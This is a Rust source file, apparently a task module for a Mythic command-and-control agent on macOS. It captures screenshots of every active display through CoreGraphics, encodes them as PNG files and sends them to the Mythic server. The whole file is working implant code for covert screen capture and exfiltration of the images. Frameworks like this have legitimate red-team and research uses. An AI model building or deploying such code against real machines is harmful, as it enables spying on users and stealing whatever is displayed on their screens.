use crate::structs::{SendFileToMythicStruct, Task};
use tokio::sync::mpsc;

extern "C" {
    fn CGMainDisplayID() -> u32;
    fn CGGetActiveDisplayList(max_displays: u32, active_displays: *mut u32, display_count: *mut u32) -> i32;
    fn CGDisplayBounds(display: u32) -> CGRect;
    fn CGDisplayCreateImageForRect(display: u32, rect: CGRect) -> *mut std::ffi::c_void;
    fn CGImageRelease(image: *mut std::ffi::c_void);
    fn CGImageGetWidth(image: *const std::ffi::c_void) -> usize;
    fn CGImageGetHeight(image: *const std::ffi::c_void) -> usize;
    fn CGImageGetBytesPerRow(image: *const std::ffi::c_void) -> usize;
    fn CGImageGetDataProvider(image: *const std::ffi::c_void) -> *mut std::ffi::c_void;
    fn CGDataProviderCopyData(provider: *const std::ffi::c_void) -> *mut std::ffi::c_void;
    fn CFDataGetLength(data: *const std::ffi::c_void) -> isize;
    fn CFDataGetBytePtr(data: *const std::ffi::c_void) -> *const u8;
    fn CFRelease(cf: *const std::ffi::c_void);
}

#[repr(C)]
#[derive(Copy, Clone)]
struct CGPoint {
    x: f64,
    y: f64,
}

#[repr(C)]
#[derive(Copy, Clone)]
struct CGSize {
    width: f64,
    height: f64,
}

#[repr(C)]
#[derive(Copy, Clone)]
struct CGRect {
    origin: CGPoint,
    size: CGSize,
}

fn capture_display(display_id: u32) -> Result<Vec<u8>, String> {
    unsafe {
        let bounds = CGDisplayBounds(display_id);
        let image = CGDisplayCreateImageForRect(display_id, bounds);
        if image.is_null() {
            return Err("Failed to capture display".to_string());
        }

        let width = CGImageGetWidth(image);
        let height = CGImageGetHeight(image);
        let data_provider = CGImageGetDataProvider(image);
        if data_provider.is_null() {
            CGImageRelease(image);
            return Err("Failed to get data provider".to_string());
        }

        let cf_data = CGDataProviderCopyData(data_provider);
        if cf_data.is_null() {
            CGImageRelease(image);
            return Err("Failed to copy data".to_string());
        }

        let len = CFDataGetLength(cf_data) as usize;
        let ptr = CFDataGetBytePtr(cf_data);
        let bytes_per_row = CGImageGetBytesPerRow(image);

        // Convert BGRA to RGBA
        let mut rgba = Vec::with_capacity(width * height * 4);
        for y in 0..height {
            for x in 0..width {
                let offset = y * bytes_per_row + x * 4;
                if offset + 3 < len {
                    let b = *ptr.add(offset);
                    let g = *ptr.add(offset + 1);
                    let r = *ptr.add(offset + 2);
                    let a = *ptr.add(offset + 3);
                    rgba.push(r);
                    rgba.push(g);
                    rgba.push(b);
                    rgba.push(a);
                }
            }
        }

        CFRelease(cf_data);
        CGImageRelease(image);

        // Encode as PNG
        let mut png_data = Vec::new();
        {
            let mut encoder = png::Encoder::new(&mut png_data, width as u32, height as u32);
            encoder.set_color(png::ColorType::Rgba);
            encoder.set_depth(png::BitDepth::Eight);
            let mut writer = encoder
                .write_header()
                .map_err(|e| format!("PNG header error: {}", e))?;
            writer
                .write_image_data(&rgba)
                .map_err(|e| format!("PNG write error: {}", e))?;
        }

        Ok(png_data)
    }
}

pub async fn execute(task: Task) {
    let mut response = task.new_response();

    // Get active display list
    let display_count = unsafe {
        let mut count: u32 = 0;
        CGGetActiveDisplayList(0, std::ptr::null_mut(), &mut count);
        count
    };

    if display_count == 0 {
        response.set_error("No active displays found");
        let _ = task.job.send_responses.send(response).await;
        let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
        return;
    }

    let mut display_ids = vec![0u32; display_count as usize];
    unsafe {
        CGGetActiveDisplayList(display_count, display_ids.as_mut_ptr(), std::ptr::null_mut());
    }

    let mut files_sent = 0;
    let total_displays = display_ids.len();

    for (i, &display_id) in display_ids.iter().enumerate() {
        match capture_display(display_id) {
            Ok(png_data) => {
                let (finished_tx, mut finished_rx) = mpsc::channel(1);
                let msg = SendFileToMythicStruct {
                    task_id: task.data.task_id.clone(),
                    is_screenshot: true,
                    file_name: format!("Monitor {}", i),
                    send_user_status_updates: false,
                    full_path: String::new(),
                    data: Some(png_data),
                    finished_transfer: finished_tx,
                    tracking_uuid: String::new(),
                    file_transfer_response: None,
                };
                if task.job.send_file_to_mythic.send(msg).await.is_ok() {
                    let _ = finished_rx.recv().await;
                    files_sent += 1;
                }
            }
            Err(e) => {
                response.user_output = format!("Failed to capture display {}: {}", i, e);
                let _ = task.job.send_responses.send(response.clone()).await;
            }
        }
    }

    if files_sent == total_displays {
        response.completed = true;
        response.status = "completed".to_string();
    } else {
        response.set_error(&format!(
            "Only captured {}/{} displays",
            files_sent, total_displays
        ));
    }
    let _ = task.job.send_responses.send(response).await;
    let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
}
